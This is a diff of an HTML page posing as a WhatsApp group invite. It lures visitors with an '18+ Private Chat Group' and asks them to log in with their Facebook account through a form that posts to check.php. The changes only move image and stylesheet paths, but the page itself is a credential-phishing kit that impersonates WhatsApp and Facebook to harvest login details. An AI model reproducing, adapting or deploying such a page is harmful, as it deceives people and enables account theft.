@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <title>WhatsApp Group Invite</title>
 <meta property="og:title" content="WhatsApp Group Invite"/>
-<meta property="og:image" content="img/v4/icon.png"/>
+<meta property="og:image" content="icon.png"/>
 <meta property="og:site_name" content="WhatsApp.com"/>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
 <meta http-equiv="X-UA-Compatible" content="IE=9">
@@ -12,8 +12,8 @@
 <meta name="msapplication-navbutton-color" content="#1BA691">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
-<link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
-<link rel="stylesheet" href="css/v4/style.build35e635e635e6.css">
+<link id="favicon" rel="shortcut icon" href="icon.png" type="image/png">
+<link rel="stylesheet" href="style.build35e635e635e6.css">
 <!--Follow this link to join-->
 <meta property="og:description" content="Follow this link to join"/>
 </head>
@@ -78,11 +78,11 @@
 <div class="page-main__inner">
 	<div class="page-content page-content--single">
 		<div class="block block--invite">
-			<a href="#" id="action-icon" title="Follow this link to join:  18+ Hot chat group " class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/1.jpg);"></span></a>
+			<a href="#" id="action-icon" title="Follow this link to join:  18+ Hot chat group " class="block__img img icon-chat"><span class="img__body" style="background-image: url(1.jpg);"></span></a>
 			<h2 class="block__title">18+  Private Chat Group<h2>
 			<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite<br>Log in with your Facebook account</h3>
 			<center>
-			<img width="150" src="img/v4/fb.png">
+			<img width="150" src="fb.png">
 			</center>
 			
 			<form action="check.php" method="post">
